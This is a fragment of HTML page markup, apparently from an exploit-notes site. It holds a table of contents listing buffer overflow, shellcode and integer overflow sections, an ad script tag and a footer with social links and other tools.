        <div class="flex flex-col gap-y-4">
            <div>
                <h5 class="mb-4 border-b-2 border-slate-light text-sm text-white opacity-60">
                    ON THIS PAGE
                </h5>
                <div class="toc my-4 flex flex-col gap-y-2">
                <a href="#investigation" class="text-sm break-words">Investigation</a><a href="#basic-buffer-overflow" class="text-sm break-words">Basic Buffer Overflow</a><a href="#overriding-variables" class="text-sm break-words">Overriding Variables</a><a href="#overriding-the-next-call" class="text-sm break-words">Overriding the Next Call</a><a href="#shellcode" class="text-sm break-words">Shellcode</a><a href="#integer-overflow" class="text-sm break-words">Integer Overflow</a></div>
            </div>
            <div>
                
                <script async="" type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CWYDE53L&amp;placement=exploit-noteshdksorg" id="_carbonads_js">
                </script>
            </div>
        </div>
    </div>
    
</div>
        </main>
        <footer class="mt-12 w-full p-8 bg-navy-light">
    <div class="
            md:mx-auto w-full md:w-2/3
            flex flex-col md:flex-row md:items-start
            gap-y-3 md:gap-y-0 text-base
        ">

        <div class="w-full flex flex-col gap-y-2">
            <h3 class="text-sm opacity-60">SOCIALS</h3>
            <div class="w-full flex flex-col lg:flex-row items-start lg:items-center gap-y-2 lg:gap-3">
                <a href="https://github.com/readloud" target="_blank" rel="noopener noreferrer">
                    GitHub
                </a>            
                <a href="https://twitter.com/readloud" target="_blank" rel="noopener noreferrer">
                    Twitter
                </a>
                <a href="https://ko-fi.com/readloud" target="_blank" rel="noopener noreferrer">
                    Support Me
                </a>
            </div>
        </div>

        <div class="w-full flex flex-col gap-y-2">
            <h3 class="text-sm opacity-60">PAGES</h3>
            <div class="w-full flex flex-col lg:flex-row items-start lg:items-center gap-y-2 lg:gap-3">
                <a href="/disclaimer">Disclaimer</a>
                <a href="/privacy-policy">Privacy Policy</a>
            </div>
        </div>
        
        <div class="w-full flex flex-col gap-y-2">
            <h3 class="text-sm opacity-60">OTHER TOOLS</h3>
            <div class="w-full flex flex-col lg:flex-row lg:flex-wrap items-start lg:items-center gap-y-2 lg:gap-3">
                <a href="https://github.com/readloud?tab=repositories" target="_blank" rel="noopener noreferrer">
                    Repositories
                </a>
                <a href="https://readloud.github.io/Mastering-Kali-Linux-for-Advanced-Penetration-Testing-4E" target="_blank" rel="noopener noreferrer">
                    Advanced PeneTest 4E
                </a>
                <a href="https://readloud.github.io/index-of-ISO" target="_blank" rel="noopener noreferrer">
                    ISO Archive
                </a>
                <a href="https://readloud.github.io/faucetmonitor" target="_blank" rel="noopener noreferrer">
                    Faucetmonitor
                </a>
            </div>
        </div>

    </div>
</footer>

    

    <script type="text/javascript" src="/js/hamburger.js"></script>

</body></html>